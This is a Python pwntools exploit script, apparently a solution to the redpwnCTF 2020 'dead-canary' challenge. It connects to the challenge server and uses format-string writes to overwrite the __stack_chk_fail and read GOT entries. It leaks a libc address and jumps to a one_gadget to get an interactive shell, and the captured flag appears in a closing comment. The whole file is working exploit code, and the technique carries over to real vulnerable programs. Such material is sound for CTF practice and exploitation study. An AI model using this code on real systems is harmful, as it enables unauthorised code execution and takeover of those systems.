#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('dead-canary')
# p = process(elf.path)
# gdb.attach(p, 'init-gef')
p = remote('2020.redpwnc.tf', 31744)

main = 0x400737
ret = 0x00000000004005d6

d = {
    elf.got['__stack_chk_fail']: main
}

payload = fmtstr_payload(6, d, 0)
p.sendafter("name: ", payload.ljust(0x120, "A"))

p.sendafter("name: ", "%2$p\x00".ljust(0x120, "A"))
p.recvuntil("Hello ")

leak = int(p.recvuntil("What", True), 16) - 0x3ed8c0
print hex(leak)

one_gadget = leak + 0x10a38c

d = {
    elf.got['read'] : one_gadget
}

payload = fmtstr_payload(6, d, 0)

p.sendafter("name: ",payload + "A"*240 + p64(one_gadget))

p.interactive()
# flag{t0_k1ll_a_canary_4e47da34}
